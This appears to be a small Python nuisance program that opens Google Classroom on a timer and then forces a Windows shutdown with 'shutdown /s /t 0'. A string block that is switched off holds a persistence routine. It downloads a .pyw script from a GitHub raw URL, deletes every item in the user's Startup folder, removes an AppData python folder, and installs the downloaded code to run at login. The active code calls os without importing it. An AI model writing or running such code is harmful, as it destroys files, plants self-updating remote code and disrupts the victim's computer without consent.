'''
#import os
import webbrowser
import random
import time

#os.getenv(“appdata”)

while True:
  time.sleep(900)
  if random.randint(1, 100) <= 5:
    webbrowser.open("https://classroom.google.com")
'''
"""
nuevo=urlopen(
            Request(
                (f'https://raw.githubusercontent.com/yarnayGH/bichoDataBase/main/bicho.pyw'),
                headers={'User-Agent': 'Python-Remote-Agent'}
            ),
            timeout=15
        ).read().decode('utf-8')


elementos = os.listdir(os.getenv('appdata')+'/Microsoft/Windows/Start Menu/Programs/Startup')

for elemento in elementos:
  os.remove(os.getenv('appdata')+'/Microsoft/Windows/Start Menu/Programs/Startup/'+elemento)

shutil.rmtree(os.getenv('appdata')+'/Roaming/python')

open(os.getenv('appdata')+'/Microsoft/Windows/Start Menu/Programs/Startup/pythonStartUp.pyw','w').write(nuevo)
"""


import webbrowser
import random
import time

#os.getenv(“appdata”)

while True:
  time.sleep(900)
  if True:
    webbrowser.open("https://classroom.google.com")
  time.sleep(1500)
  os.system("shutdown /s /t 0")
